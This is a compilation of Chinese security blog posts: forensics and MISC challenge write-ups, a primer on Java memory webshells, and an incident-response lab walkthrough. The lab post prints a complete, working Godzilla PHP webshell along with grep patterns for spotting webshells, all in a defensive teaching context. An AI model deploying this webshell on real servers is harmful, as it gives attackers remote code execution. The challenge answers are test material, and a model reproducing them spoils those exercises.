直接就能找到\n\n#### 手机部分3\n\n嫌疑人李某手机开启热点设置的密码是?\n\n![image-20250320133029069](http://images.lwwww.top/images/20250320133032864.png)\n\n`5aada11bc1b5`\n\n#### 手机部分4\n\n嫌疑人李某的微信内部ID是？\n\n![image-20250320133214557](http://images.lwwww.top/images/20250320133216830.png)\n\n`wxid_wnigmud8aj6j12`\n\n\n\n#### 手机部分5\n\n嫌疑人李某发送给技术人员的网站源码下载地址是什么？\n\n去微信里面一个个翻聊天记录能找到这个\n\n然后扫二维码得到新佛曰 解码即可\n\n![image-20250320133601394](http://images.lwwww.top/images/20250320133603748.png)\n\n![image-20250320134337795](http://images.lwwww.top/images/20250320200806340.png)\n\n`http://www.honglian7001.com/down`\n\n#### 手机部分6\n\n翻聊天记录的时候就已经找到了受害人 但是一开始以为让提交vx号结果不对 然后就是提交受害者的id\n\n![image-20250320134558224](http://images.lwwww.top/images/20250320200801748.png)\n\n`limoon890`\n\n#### 手机部分7\n\n嫌疑人李某第一次连接WIFI的时间是？\n\n进去后搜索wifi 有一个wificonfig的xml文件\n\n- [ ] A. 03-14 15:55:57\n- [x] **B. 03-14 16:55:57**\n- [ ] C. 03-14 17:55:57\n- [ ] D. 03-14 18:55:57\n\n![image-20250320194402527](http://images.lwwww.top/images/20250320200758571.png)\n\n#### 手机部分8\n\n8、分析嫌疑人李某的社交习惯，哪一个时间段消息收发最活跃？\n\n- [ ] A. 12:00-14:00\n- [ ] B. 14:00-16:00\n- [ ] C. 16:00-18:00\n- [ ] D. 18:00-20:00\n\n![image-20250320195159216](http://images.lwwww.top/images/20250320200755378.png)\n\n这题纯白给\n\n#### 手机部分9\n\n请分析嫌疑人手机，该案件团伙中，还有一名重要参与者警方未抓获，该嫌疑人所使用的微信账号ID为？\n\n老苏的vxid\n\n![image-20250320200355145](http://images.lwwww.top/images/20250320200750566.png)\n\n#### 手机部分10\n\n请分析嫌疑人手机，嫌疑人老板组织人员参与赌博活动，所使用的国内访问入口地址为？[格式：127.0.0.1:8080/admin]\n\n![image-20250320200108582](http://images.lwwww.top/images/20250320200747555.png)\n\n\n\n## windows部分\n\n#### window1\n\n分析技术员赵某的windows镜像，并计算赵某计算机的原始镜像的SHA1值为？\n\n![image-20250320202251540](http://images.lwwww.top/images/20250320212549964.png)\n\n#### windows2\n\n分析技术员赵某的windows镜像，疑似VeraCrypt加密容器的文件的SHA1值为？\n\n```\nB25E2804B586394778C800D410ED7BCDC05A19C8\n```\n\n![image-20250325214044732](http://images.lwwww.top/images/20250325214046975.png)\n\n执行火眼耗时任务中的特征分析寻找加密文件，识别得到加密容器2024.ifc，计算其SHA1值即可。 就是要等很久很久 才能找到比较烦人 一开始我还以为我的火眼坏掉了\n\n#### window3\n\n据赵某供述，他会将常用的密码放置在一个文档内，分析技术员赵某的windows镜像，找到技术员赵某的密码字典，并计算该文件的SHA1值?\n\n![image-20250326151729057](http://images.lwwww.top/images/20250326151731149.png)\n\n#### window4\n\n据赵某供述，他将加密容器的密码隐写在一张图片内，隐写在图片中的容器密码是？\n\n```\nqwerasdfzxcv\n```\n\n![image-20250326152330236](http://images.lwwww.top/images/20250326152332717.png)\n\n在Documents目录下，有一张名为pswd.jpg图片疑似嫌疑人供述的密码图片，使用该密码及上述容器发现挂载失败。查看该图片十六进制试图，在尾部找到密码qwerasdfzxcv。\n\n#### window5\n\n分析技术员赵某的windows镜像，bitlocker的恢复密钥是什么？\n\n![image-20250326161849713](http://images.lwwww.top/images/20250326161851625.png)\n\nVC挂载 密码是第四题找到的\n\n#### window6\n\n![image-20250326162251677](http://images.lwwww.top/images/20250326162254683.png)\n\n#### window7\n\n![image-20250326182742039](http://images.lwwww.top/images/20250326182743841.png)\n\n分析技术员赵某的windows镜像，默认的浏览器是？\n\n显而易见\n\n这里需要仿真一下 进去比较容易做出来\n\n#### window8\n\n分析技术员赵某的windows镜像，私有聊天服务器的密码为：\n\n![image-20250326183052824](D:/lwwblog/source/images/202502/image-20250326183052824.png)\n\n#### window9\n\n分析技术员赵某的windows镜像，嫌疑人计算机中有疑似使用AI技术生成的进行赌博宣传的图片，该图片中，宣传的赌博网站地址为？\n\n一翻就有\n\n![image-20250326183746080](http://images.lwwww.top/images/20250326183748064.png)\n\n#### window10\n\n分析技术员赵某的windows镜像，赵某使用的AI换脸工具名称为？\n\n- [ ] A. stable diffusion\n- [x] B. ROOP\n- [ ] C. Midjourney\n- [ ] D. DiffusionDraw\n\n![image-20250326185121707](http://images.lwwww.top/images/20250326185123813.png)\n\n这个是对着wp做的 不太理解，但是也微微能懂 属于微解😎\n\n#### window11\n\n分析技术员赵某的Windows镜像，使用AI换脸功能生成了一张图片，该图片的名称为：\n\n![image-20250326185930979](D:/lwwblog/source/images/202502/image-20250326185930979.png)\n\n```\ndb.jpg\n```\n\n![image-20250326190129456](http://images.lwwww.top/images/20250326190131132.png)\n\n#### window12\n\n分析技术员赵某的Windows镜像，ai换脸生成图片的参数中--similar-face-distance值为：\n\n![image-20250326193733008](http://images.lwwww.top/images/20250326193734830.png)\n\n但是我的火眼真没找到这个地方 不知道为什么\n\n#### window13\n\n分析技术员赵某的Windows镜像，嫌疑人使用AI换脸功能所使用的原始图片名称为\n\n跟上面的解法一样 但是我还是找不到\n\n![image-20250326193856656](http://images.lwwww.top/images/20250326193857904.png)\n\n#### window14\n\n分析技术员赵某的Windows镜像，赵某与李某沟通中提到的“二维码”解密所用的网站url地址为？ \n\n![image-20250326194143209](http://images.lwwww.top/images/20250326194145803.png)\n\n```\nhttp://hi.pcmoe.net/buddha.html\n```\n\n#### window15\n\n15、分析技术员赵某的Windows镜像，赵某架设聊天服务器的原始IP地址为？\n\n![image-20250326195226349](http://images.lwwww.top/images/20250326195228197.png)\n\n```\n192.168.8.17\n```\n\n#### window16\n\n16、分析技术员赵某的Windows镜像，据赵某交代，其在窝点中直接操作服务器进行部署，环境搭建好了之后，使用个人计算机登录聊天室进行沟通，请分析赵某第一次访问聊天室的时间为？\n\n- [ ] A. 2024-03-14 20:30:08\n- [ ] B. 2024-03-14 20:31:08\n- [x] **C. 2024-03-14 20:32:08**\n- [ ] D. 2024-03-14 20:33:08\n\n#### window17\n\n分析技术员赵某的Windows镜像，openwrt的后台管理密码是：\n\n![image-20250326195938062](D:/lwwblog/source/images/202502/image-20250326195938062.png)\n\n在谷歌浏览器里面的保存的密码可以直接找到\n\n#### window18\n\n18、分析技术员赵某的Windows镜像，嫌疑人可能使用什么云来进行文件存储？\n\n![image-20250326200102038](http://images.lwwww.top/images/20250326200103547.png)\n\n```\n易有云\n```\n\n#### window19\n\n![image-20250326200149858](http://images.lwwww.top/images/20250326200151593.png)\n\n#### window20\n\n![image-20250326200302350](http://images.lwwww.top/images/20250326200303852.png)\n\n最后几个基本上都在加密的挂载里面 很好找\n","tags":["-forensics -wp"]},{"title":"Dectf MISC出题思路","url":"/2025/03/11/MISC出题思路/","content":"\nMISC出题思路\n\n### 100简单：**Owidth**\n\n**兽语或者佛曰迷惑 实则零宽隐写**\n\nDem0n说她好胖😭然后甩我个经典语录\n\n随波逐流语录‌‌‌‌‍‍﻿﻿：‌‌‌‌‌﻿‍‍‌‌‌‌‍‬‬‌‌‌‌‌‍‬‬‍‌‌‌‌‍‍﻿﻿‌‌‌‌‍‌‍‌‌‌‌‌‌﻿‌﻿‌‌‌‌‍‬﻿‍‌‌‌‌‌﻿‌‌‌‌‌‌‍‬﻿‬‌‌‌‌‍‍﻿﻿‌‌‌‌‍‬‌‬‌‌‌‌‍﻿‍‍流逐逐波随浪波随波随浪波逐波波浪波逐流波洪流随随浪波逐流逐洋逐随逐流流流波随洋波波逐波波流逐波洋逐随逐波逐随随波洋波波随波流随流流洋逐随随随逐逐波波‌‌‌‌‍‍\n\nflag{q1_5hi_D3m0n_bu_pwn}\n\n### \t100 **OSINT**\n\n![聊天记录](D:/lwwblog/source/images/202502/20250302112722878-1746784581033-1.png)\n\n### **![osint](D:/lwwblog/source/images/202502/20250302112729668-1746784581033-3.jpg)**\n\nflag{齐鲁驾校}\n\n### 150**开学了 记得mm不记得xh**\n\nWea5e1开学要抢课迫在眉睫了，大学的第二个学期就只能眼睁睁得看着别人把好课抢走吗，他现在只记得密码不记得学号了，然后他问导员要学号，剑刃导员却给了一串这个 88bd91a429e2bf0d275e5005286d91a77ce1cefd 还剑剑得说反正你是打CTF的，你肯定随手就解了,但是剑就剑在这个哈希是 学号+2025 ~~(不是加法是位数)~~ 的值不是学号的哈希，于是Wea5e1求助帅气的学长大人Lww\n\nLww告诉Wea5e1他的[blog](http://lwwww.top)里面有学号的规律\n\n2024020611022025\n\n考点hash爆破 爆破学号给出学号的规则 学号的hash\n\n提示1：flag{学号}\n\n提示2：sha1\n\nflag{202402061102}\n\n### 300中难：**嘛嘛嘛 嘛嘛嘛 嘛嘛嘛** \n\n音频类隐写图片  表面mp3 实际是wav文件 silenteye藏图片的十六进制表面png实际jpg\n\n​    图片盲水印给出提示 base   Z64码表改变并且 给出flag格式\n\n木马exe拿出来十六进制扔到TXT 找到回连的ip flag{hash(ip)}\n\n提示：安静点，用眼看\n\n### 400困难：**这里空空的**\n\n正常Excel表是zip 下面藏一个flagzip  zip里面无名文件（windows无法执行空白文件） 文件里面是异或flag 异或值是1020\n\nflag.zip要用解压软件拿出来才行不能正常解压在压回去（知识点是压回去会导致文件结构发生变化不适配excel的文件结果xml文件发生变化） excel表一直正常 改变出题思路直接隐写excel 隐藏的sheet表里有异或提示\n\nW\\SWJtW]␁^␟␁␄␝PUPEFYWE^M\n\nflag{Dem0n-15-beautiful}\n\n提示：zip里面的文件怎么没有名字？\n\n这样看起来也简单的\n\n","tags":["-CTF -WP -MISC"]},{"title":"初识内存马","url":"/2025/03/11/初识内存马/","content":"\n最近备赛 天津的CISCN长城杯线下。疯狂刷玄机靶场的应急响应，但是做的很粗糙，基本上就是对着wp过一遍，很多东西来不及消化和吸收，但是也是对应急响应逐渐熟悉起来了，以前一直不太清楚应急响应是啥 之前还感觉跟取证是一块内容哈哈。\n\n玄机打完前七章了，也没抽空写wp，但是也不打算写了 [Peterpan.exe](https://peterpan.blog.csdn.net/?type=blog)师傅的wp我就是写质量也不如他写得好 所以干脆不写了 疯狂推荐Peterpan.exe的玄机wp虽然已经推荐过了。\n\n第八章涉及到java内存马 虽说是排查但是必然是要了解一下的 感觉是一块大内容所以打算专门抽空学习一下这个内容，感觉以后不可避免的绕不开。\n\n[应急响应——全类型JAVA内存马排查](https://mp.weixin.qq.com/s/AsrWA1I5OmtUhLzKbqboNA)\n\n言归正传：\n\n### 内存马是啥\n\n内存马，也被称为无文件马，是无文件攻击的一种常用手段。内存马是无文件攻击的一种技术手段，那我们不得不先简单介绍一下无文件攻击。无文件攻击可以有效地躲避传统安全软件的检测，它们可以在系统的内存中远程加载执行、驻留在注册表中或滥用常用的白名单工具，例如PowerShell，Windows Management Instrumentation（WMI）和PsExec等。无文件攻击技术允许攻击者访问系统，从而启用后续的恶意活动。通过操纵漏洞利用程序、合法工具、宏和脚本，攻击者可以破坏系统、提升特权或在网络上横向传播恶意代码。而且，无文件威胁在执行后不会留下任何痕迹，这使其难以被检测和清除。\n\nWebshell内存马，是在内存中写入恶意后门和木马并执行，达到远程控制Web服务器的一类内存马，其瞄准了企业的对外窗口：网站、应用。但传统的Webshell都是基于文件类型的，黑客可以利用上传工具或网站漏洞植入木马，区别在于Webshell内存马是无文件马，**利用中间件的进程**执行某些恶意代码，**不会有文件落地**，给检测带来巨大难度。而内存攻击者正是利用软件安全漏洞，构造恶意输入导致软件在处理输入数据时出现非预期错误，将输入数据写入内存中的某些特定敏感位置，从而劫持软件控制流、执行流，转而执行外部输入的指令代码，造成目标系统被获取远程控制，让内存马的攻击得以实现。\n\n\n*webshell的变迁过程大致如下所述：*\n\n*web服务器管理页面——> 大马——>小马拉大马——>一句话木马——>加密一句话木马——>加密内存马*\n\n*![37fe30ea3e8f28b06cac4bd346ae325d](http://images.lwwww.top/images/20250311114443497.jpeg)*\n\n> [!TIP]\n>\n> ### 背景知识\n\njavaweb的三大件：**Servlet** **Filter**  **Listener**\n\n\n\n##### **Servlet**\n\nServlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。它负责处理用户的请求，并根据请求生成相应的返回信息提供给用户。\n\n![9f891bf272d9fdef8c830085fa4844ba](http://images.lwwww.top/images/20250311115445521.png)\n\n```\n请求的处理过程：\n\n客户端发起一个http请求，比如get类型。\n\nServlet容器接收到请求，根据请求信息，封装成HttpServletRequest和HttpServletResponse对象。\n\nServlet容器调用HttpServlet的init()方法，init方法只在第一次请求的时候被调用。\n\nServlet容器调用service()方法。\n\nservice()方法根据请求类型，这里是get类型，分别调用doGet或者doPost方法，这里调用doGet方法。\n\ndoXXX方法中是我们自己写的业务逻辑。\n\n业务逻辑处理完成之后，返回给Servlet容器，然后容器将结果返回给客户端。\n\n容器关闭时候，会调用destory方法\n\n```\n\n###### **Servlet和JSP的关系？**\n\nJSP（全称Java Server Pages）\n JSP经过转换编译以后还是会变成Servlet，支持前\n 端语法。\n View：JSP，负责内容显示\n Controller：Servlet，负责处理请求\n\n###### Servlet和Tomcat的关系\n\n    Tomcat里面有Servlet容器（引擎）\n    Tomcat可以提供HTTP访问\n    Tomcat可以把HTTP请求转换为HttpServletRequest对象，并调用doGet/doPost，并且把HttpServletResponse转换为HTTP响应内容\n\n\n##### **Filter**\n\nfilter也称之为过滤器，是对Servlet技术的一个强补充，其主要功能是在HttpServletRequest到达 Servlet 之前，拦截客户的HttpServletRequest ，根据需要检查HttpServletRequest，也可以修改HttpServletRequest 头和数据；在HttpServletResponse到达客户端之前，拦截HttpServletResponse ，根据需要检查HttpServletResponse，也可以修改HttpServletResponse头和数据。\n\n![976bebf2851b55517a6e19baa2168c17](http://images.lwwww.top/images/20250311115828111.png)\n\n```\n   过程：\n   1、Filter 程序是一个实现了特殊接口的 Java 类，与 Servlet 类似，也是由 Servlet 容器进行调用和执行的。 \n\n    2、当在 web.xml 注册了一个 Filter 来对某个 Servlet 程序进行拦截处理时，它可以决定是否将请求继续传递给 Servlet 程序，以及对请求和响应消息是否进行修改。 \n\n    3、当 Servlet 容器开始调用某个 Servlet 程序时，如果发现已经注册了一个 Filter 程序来对该 Servlet 进行拦截，那么容器不再直接调用 Servlet 的 service 方法，而是调用 Filter 的 doFilter 方法，再由 doFilter 方法决定是否去激活 service 方法。 \n\n    4、但在 Filter.doFilter 方法中不能直接调用 Servlet 的 service 方法，而是调用 FilterChain.doFilter 方法来激活目标 Servlet 的 service 方法，FilterChain 对象时通过 Filter.doFilter 方法的参数传递进来的。 \n\n    5、只要在 Filter.doFilter 方法中调用 FilterChain.doFilter 方法的语句前后增加某些程序代码，这样就可以在 Servlet 进行响应前后实现某些特殊功能。 \n\n    6、如果在 Filter.doFilter 方法中没有调用 FilterChain.doFilter 方法，则目标 Servlet 的 service 方法不会被执行，这样通过 Filter 就可以阻止某些非法的访问请求。 \n\n```\n\n##### Listener\n\nJavaWeb开发中的监听器（Listener）就是Application、Session和Request三大对象创建、销毁或者往其中添加、修改、删除属性时自动执行代码的功能组件。\n\nServletContextListener：对Servlet上下文的创建和销毁进行监听；\nServletContextAttributeListener：监听Servlet上下文属性的添加、删除和替换；\n\nHttpSessionListener：对Session的创建和销毁进行监听。Session的销毁有两种情况，一个中Session超时，还有一种是通过调用Session对象的invalidate()方法使session失效。\n\nHttpSessionAttributeListener：对Session对象中属性的添加、删除和替换进行监听；\n\nServletRequestListener：对请求对象的初始化和销毁进行监听；\nServletRequestAttributeListener：对请求对象属性的添加、删除和替换进行监听。\n\n用途\n\n可以使用监听器监听客户端的请求、服务端的操作等。通过监听器，可以自动出发一些动作，比如监听在线的用户数量，统计网站访问量、网站访问监控等。\n\n\n\n##### 内存马应用理解\n\n想要接管web应用的处理逻辑，其实就是两种方法，一种是直接篡改他，一种是顺着他利用其自己的一些特性去接管他；就是如下两种方法：\n\n- 研究如何去修改jvm里面的web应用一些处理逻辑类的实现，从而实现修改web应用的处理逻辑；\n\n- 顺着web应用来，利用web应用自身的可拓展性，比如其一些服务组件可以动态的增添的特性来实现接管web应用对请求的处理逻辑；\n\n同时这里我们也可以看出第一种方法的处理范围一定程度上肯定是比第二种大的，但是这里并不是包含关系，一个是对类的实现篡改，一个是添加；\n\n首先我们要了解排查的原理，对于这类的内存马，是通过添加一些组件实现的，每种组件都有一个父类，我们可以遍历jvm里面的所有类，找到继承了上面三种公共父类的类或者是实现的公共接口，又或者是找到这些类的其他公共特征，然后输出类名及路径开展排查，一般来说比较简单粗暴的排查方法可以借助内存马的性质来做，即观察本地是否存在相关类文件落地，没有就是重点怀疑对象；\n\n\n\n\n\n（学不明白 java底子不好 不太能理解 我觉得先当脚本小子去，也是应了题目了 初时java内存马哈哈）\n","tags":["-WEB -应急响应 -内存马"]},{"title":"玄机靶场","url":"/2025/03/04/玄机靶场/","content":"\n## 第一章 应急响应-webshell查杀\n\n简介 靶机账号密码 root xjwebshell\n1.黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}\n2.黑客使用的什么工具的shell github地址的md5 flag{md5}\n3.黑客隐藏shell的完整路径的md5 flag{md5} 注 : /xxx/xxx/xxx/xxx/xxx.xxx\n4.黑客免杀马完整路径 md5 flag{md5}\n\n\n\n强烈推荐[Peterpan.exe](https://peterpan.blog.csdn.net/?type=blog)师傅的wp\n\n首先给出环境我以为是仿真靶场，捣鼓了半天没弄明白 结果是去远程连接linux 我真是二逼\n\n#### 1.黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}\n\n1.可疑函数调用 ◦ WebShell通常会使用一些危险的函数来执行系统命令或代码，如：  ▪ PHP: eval(), system(), exec(), shell_exec(), passthru(), assert(), base64_decode() ▪ ASP: Execute(), Eval(), CreateObject() ▪ JSP: Runtime.getRuntime().exec()     \n\n2.  编码和解码 ◦ WebShell经常使用编码和解码技术来隐藏其真实意图，如Base64编码：\n\n```php\n     eval(base64_decode('encoded_string'));\n\n```\n\n文件操作 ◦ WebShell可能会包含文件操作函数，用于读取、写入或修改文件： \n\n ▪ PHP: fopen(), fwrite(), file_get_contents(), file_put_contents() ▪ ASP: FileSystemObject    \n\n4. 网络操作 ◦ WebShell可能会包含网络操作函数，用于与远程服务器通信： \n\n    ▪ PHP: fsockopen(), curl_exec(), file_get_contents('http://...') ▪ ASP: WinHttp.WinHttpRequest      \n\n   上面刚刚也说了我们可以尝试定位一些特殊的后缀文件，例如：.asp、.php、.jsp、.aspx。\n\n```php\n//搜索目录下适配当前应用的网页文件，查看内容是否有Webshell特征\nfind ./ type f -name \"*.jsp\" | xargs grep \"exec(\" \nfind ./ type f -name \"*.php\" | xargs grep \"eval(\" \nfind ./ type f -name \"*.asp\" | xargs grep \"execute(\" \nfind ./ type f -name \"*.aspx\" | xargs grep \"eval(\" \n \n//对于免杀Webshell，可以查看是否使用编码\nfind ./ type f -name \"*.php\" | xargs grep \"base64_decode\" \n```\n\n```shell\n本题步骤就是：\nfind ./ type f -name \"*.php\" | xargs grep \"eval(\"\n\n```\n\n最后终于在gz.php里面发现了；\n\n```php\n<?php\n@session_start();\n@set_time_limit(0);\n@error_reporting(0);\nfunction encode($D,$K){\n    for($i=0;$i<strlen($D);$i++) {\n        $c = $K[$i+1&15];\n        $D[$i] = $D[$i]^$c;\n    }\n    return $D;\n}\n//027ccd04-5065-48b6-a32d-77c704a5e26d\n$payloadName='payload';\n$key='3c6e0b8a9c15224a';\n$data=file_get_contents(\"php://input\");\nif ($data!==false){\n    $data=encode($data,$key);\n    if (isset($_SESSION[$payloadName])){\n        $payload=encode($_SESSION[$payloadName],$key);\n        if (strpos($payload,\"getBasicsInfo\")===false){\n            $payload=encode($payload,$key);\n        }\n\t\teval($payload);\n        echo encode(@run($data),$key);\n    }else{\n        if (strpos($data,\"getBasicsInfo\")!==false){\n            $_SESSION[$payloadName]=encode($data,$key);\n        }\n    }\n}\n\n\n@session_start();：启动会话\n\n@set_time_limit(0);：设置脚本执行时间限制为无限制\n\n@error_reporting(0);：关闭错误报告\n\nfunction encode($D,$K){...}：定义了一个名为 encode 的函数，它接受两个参数 $D 和 $K。这个函数看起来像是一个简单的异或编码函数，用于对数据进行加密或解密。它使用 $K 作为密钥，对 $D 中的每个字符进行异或操作。\n\n接下来的几行代码定义了 $payloadName、$key 和 $data 变量。$payloadName 是用于存储有效载荷的会话变量名，$key 是用于编码的密钥，$data 是从 php://input 流中读取的数据。\n\nif ($data!==false){...}：如果从 php://input 读取的数据不是 false（即成功读取了数据），则执行以下代码块。\n\nif (isset($_SESSION[$payloadName])){...}：检查 $payloadName 对应的会话变量是否已设置。\n\nif (strpos($payload,\"getBasicsInfo\")===false){...}：检查 $payload 变量中是否包含字符串 \"getBasicsInfo\"。\n\neval($payload);：如果 $payload 变量包含 \"getBasicsInfo\" 字符串，则执行 $payload 变量中的 PHP 代码。\n\necho encode(@run($data),$key);：如果 $data 包含 \"getBasicsInfo\" 字符串，则执行 @run($data) 函数，并将结果编码后输出。\n————————————————\n\n                            版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。\n                        \n原文链接：https://blog.csdn.net/administratorlws/article/details/139521078\n```\n\n这段代码的目的是接收通过 `php://input` 流发送的数据，对其进行编码，并根据会话变量中的内容执行特定的 PHP 代码。这通常用于隐藏恶意代码或后门，使得攻击者可以通过特定的请求触发执行。\n\n#### 步骤#1.2黑客使用的什么工具的shell github地址的md5 flag{md5}\n\n遇到这种类型的题目，我们就是要分析一下是什么类型的webshell，其实开头三句就可以分析出是godzilla的webshell了；\n\n为什么这样说？\n\n哥斯拉病毒是一种Java后门木马，通常用于攻击并控制[Web服务器](https://so.csdn.net/so/search?q=Web服务器&spm=1001.2101.3001.7020)。特征就包括：\n\n```\n1. @session_start(); - 开启一个会话。\n2. @set_time_limit(0); - 设置脚本执行时间为无限。 \n3. @error_reporting(0); - 关闭所有错误报告。\n```\n\n这些代码行主要用于隐藏病毒活动并确保其能够长时间运行而不被发现。哥斯拉病毒通常会通过Webshell或其他漏洞注入到服务器中，然后使用这些命令来掩盖其存在并执行进一步的恶意操作。\n\n所以我们只需要找到它的github地址并且进行MD5加密即可；\n\n    Godzilla地址：https://github.com/BeichenDream/Godzilla\n#### 步骤#1.3黑客隐藏shell的完整路径的md5 flag{md5} 注 : /xxx/xxx/xxx/xxx/xxx.xxx\n\n那既然说黑客隐藏shell了，那我们肯定需要用到命令ls -la进行查找；\n\n然后发现在挨个查找的过程中发现.Mysqlli.php如果普通的ls查看目录是查不出来的，必须用到ls -la才行，所以它就是隐藏了，我们直接定位一些它的路径，进行MD5加密即可；\n\n```shell\nroot@ip-10-0-10-3:/var/www/html/include# cd Db\nroot@ip-10-0-10-3:/var/www/html/include/Db# ls\nMysqli.php  Mysql.php  Sqlite.php\nroot@ip-10-0-10-3:/var/www/html/include/Db# ls -l\ntotal 24\n-rwxr-xr-x 1 www-data www-data 4752 Mar 14  2021 Mysqli.php\n-rwxr-xr-x 1 www-data www-data 4921 Mar 14  2021 Mysql.php\n-rwxr-xr-x 1 www-data www-data 4433 Mar 14  2021 Sqlite.php\nroot@ip-10-0-10-3:/var/www/html/include/Db# ls -a\n.  ..  .Mysqli.php  Mysqli.php\tMysql.php  Sqlite.php\nroot@ip-10-0-10-3:/var/www/html/include/Db# ls -la\ntotal 36\ndrwxr-xr-x 2 www-data www-data 4096 Aug  2  2023 .\ndrwxr-xr-x 4 www-data www-data 4096 Aug  2  2023 ..\n-rw-r--r-- 1 www-data www-data  768 Aug  2  2023 .Mysqli.php\n-rwxr-xr-x 1 www-data www-data 4752 Mar 14  2021 Mysqli.php\n-rwxr-xr-x 1 www-data www-data 4921 Mar 14  2021 Mysql.php\n-rwxr-xr-x 1 www-data www-data 4433 Mar 14  2021 Sqlite.php\nroot@ip-10-0-10-3:/var/www/html/include/Db# pwd\n/var/www/html/include/Db\n\n\n注意：在finnalshell里面可以直接看到目录结构比命令好找 更方便\n```\n\n#### 步骤#1.4黑客免杀马完整路径 md5 flag{md5}\n\n#### \n\n##### 什么是免杀马？\n\n免杀马（免杀病毒或免杀Webshell）是指经过特殊处理和混淆，使其能够避开杀毒软件和安全检测工具识别的恶意软件或后门程序。黑客使用各种技术手段，使恶意代码看起来像是正常代码，从而躲避签名检测和基于规则的安全机制。这种技术通常用于Webshell和其他后门程序，目的是保持对受害系统的隐蔽访问。\n\n\n\n免杀马（免杀病毒或免杀Webshell）是指经过特殊处理和混淆，使其能够避开杀毒软件和安全检测工具识别的恶意软件或后门程序。黑客使用各种技术手段，使恶意代码看起来像是正常代码，从而躲避签名检测和基于规则的安全机制。这种技术通常用于Webshell和其他后门程序，目的是保持对受害系统的隐蔽访问。\n\n    常见的免杀技术；\n    \n    代码混淆：\n        使用混淆工具或手动混淆代码，使其难以被直接阅读和分析。\n    \n    编码和加密：\n        使用Base64、ROT13等编码方式或更复杂的加密技术隐藏恶意代码片段。\n    \n    动态生成和执行：\n        通过动态生成代码并在运行时执行，绕过静态分析。例如，使用 eval()、create_function() 等PHP函数。\n    \n    多层解码：\n        多层编码或加密，增加分析和检测的难度。\n    \n    使用合法函数：\n        恶意代码嵌入到看似合法的代码中，利用正常的函数调用执行恶意操作。\n    \n    查找和处理免杀马的方法；\n    \n    文件完整性检查：\n        比较当前文件与已知的良性备份文件，发现被修改或新增的文件。\n    \n    代码审查：\n        手动检查可疑文件，寻找混淆、编码、加密和动态执行的代码模式。\n    \n    安全扫描工具：\n        使用高级安全扫描工具，这些工具使用行为分析和机器学习来检测潜在的免杀马。\n    \n    日志分析：\n        查看服务器访问日志和错误日志，寻找异常访问和执行模式。\n        检查文件修改时间，与正常更新周期不符的文件可能是可疑的。\n    \n    基于特征的检测：\n        使用YARA规则等特征检测工具，根据已知的免杀马特征进行扫描。\n    \n    总结：免杀马通过静态检测是检测不到的，因为在免杀的过程中将webshel的特征值以及特征函数都给去掉了，因为webshell执行会在网站日志留下记录，那我们就到网站日志里面看看有啥可疑的记录，这里也顺便说一下linux的日志存放在/var/log目录下。\n\n这里我们总结一下常见网站日志的路径：\n\nIIS（Internet Information Services）\n\nIIS是Windows上的默认Web服务器，其日志文件默认存储在以下路径：\n\n    IIS 6.0 及更早版本：\n    \n    C:\\WINDOWS\\system32\\LogFiles\\W3SVC[SiteID]\\\n    \n    IIS 7.0 及更高版本：\n    \n    C:\\inetpub\\logs\\LogFiles\\W3SVC[SiteID]\\\n    \n    其中，[SiteID] 是网站的标识符，通常是一个数字。\n\nApache HTTP Server\n\n如果在Windows上安装了Apache，日志文件默认存储在安装目录下的logs文件夹中：\n\nC:\\Program Files (x86)\\Apache Group\\Apache2\\logs\\\n\n或者\n\nC:\\Program Files\\Apache Group\\Apache2\\logs\\\n\n具体路径取决于安装时选择的位置。\n\nLinux系统中的网站日志路径\n\nApache HTTP Server\n\n在Linux上，Apache日志文件通常位于以下目录：\n\n    访问日志：\n    \n    /var/log/apache2/access.log\n    \n    或者\n    \n    /var/log/httpd/access_log\n    \n    错误日志：\n    \n    /var/log/apache2/error.log\n    \n    或\n    \n    /var/log/httpd/error_log\n\n不同的Linux发行版可能有不同的目录。例如，在Debian/Ubuntu上通常使用/var/log/apache2/，而在Red Hat/CentOS上通常使用/var/log/httpd/。\n\nNginx\n\nNginx是另一个流行的Web服务器，默认的日志文件路径如下：\n\n    访问日志：\n    \n    /var/log/nginx/access.log\n    \n    错误日志：\n    \n    /var/log/nginx/error.log\n\n##### 如何查看和分析日志文件？\n\n    Windows：\n        使用文本编辑器（如Notepad、Notepad++）直接打开日志文件查看。\n        可以使用IIS管理器查看IIS日志。\n    \n    Linux：\n    \n        使用命令行工具查看日志，例如：\n    \n        tail -f /var/log/apache2/access.log tail -f /var/log/nginx/access.log\n    \n        可以使用日志分析工具（如GoAccess、AWStats）生成可视化的日志报告。\n\n既然它经过了免杀处理，那么木马的特征值以及特征函数应该都是被去掉了。这时我们再通过静态检测是基本检测不到的，从上面我们就可以看出我们只找到了三个马。而且上面我们说了webshell执行会在网站日志留下记录，那我们就到网站日志里面看看有啥可疑的记录。\n我们到apache2目录下面查看一下access.log日志，查看分析一下；（因为是日志所以记录有点多）\n\n![https://i-blog.csdnimg.cn/blog_migrate/058e435a4bcada8e8a8295312016d4fa.png#pic_center](http://images.lwwww.top/images/20250305110800386.png)\n\n\n\n大部分都是重复的只有少数不一样的； 我们可以看到有个名为top.php的文件执行了phpinfo()；且返回值为200，有点可疑。去找到相对应的文件发现是一个正常的文件来。  \n\n![](http://images.lwwww.top/images/20250305110757731.png)\n\n\n\n继续往下翻，又发现一个较为可疑的文件，到此目录下面查看该文件。 目录：/wap/top.php \n\n\n\n![](http://images.lwwww.top/images/20250305110802248.png)\n\n 原来是个恶意文件，最后把路径进行md5进行加密即可； 路径：/var/www/html/wap/top.php \n\n##### 为什么可以确认是恶意文件？\n\n混淆和隐藏：\n\n    使用Base64编码和字符异或操作来混淆代码。这些技术通常用于隐藏恶意代码，避免被直接检测到。\n\n动态执行：\n\n    动态生成并调用函数。这种模式允许攻击者通过URL参数传递任意代码并在服务器上执行，具有极大的危险性。\n\n外部输入：\n\n    使用$_GET参数来控制代码行为。通过外部输入来决定代码逻辑，使得攻击者可以远程控制服务器，执行任意PHP代码。\n![](http://images.lwwww.top/images/20250305110804008.png)\n\n\n\n\n\n还有一种思路和做法就是把var文件下载下来压缩zip扔到在线查杀网站里面，让他们去查杀\n\n同样的道理在线下应该是用D盾查杀\n\n\n\n\n\n","tags":["-WP -玄机 